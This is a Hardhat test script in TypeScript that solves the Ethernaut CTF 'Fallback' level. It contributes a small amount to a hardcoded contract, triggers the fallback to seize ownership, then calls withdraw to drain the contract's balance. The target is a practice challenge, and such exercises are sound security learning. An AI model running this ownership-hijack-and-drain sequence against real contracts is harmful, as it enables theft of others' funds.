import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("fallback", function(){
	it("Aims to Solve the Fallback Question of the Ethernaut CTF", async function(){
		this.timeout(0);

		// Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();
        
        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function contribute() public payable",
            "function fallback() external payable",
            "function owner() public view returns (address)",
            "function withdraw() public",
        ]
        const targetAddr = "0x26f504c79F3b69A1d5F97b8a70caAC05E16D1eaA"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        //Interact with the Target Contract to Exploit

        // First call contrbute function in order to be able to satisfy the conditions of the fallback function
        let initialTransaction = await targetCont.contribute({ value: utils.parseEther("0.00002") });
        await initialTransaction.wait();
        console.log(initialTransaction);

        //Now Call the Fallback Function to Claim the Ownership of the Contract
        let fallback_transaction = await targetCont.fallback({ value: utils.parseEther("0.00002") });
        await fallback_transaction.wait();
        console.log(fallback_transaction);

        // Ownership Check
        let owner = await targetCont.owner();
        expect(owner).to.eq(eoa.address);

        // Drain the Contract
        let drain_transaction = await targetCont.withdraw();
        await drain_transaction.wait();
        console.log(drain_transaction);

        //Check If the Target is Empty
        let targetBalance = await eoa.provider!.getBalance(targetCont.address);
        expect(targetBalance).to.eq(0); 
	});

});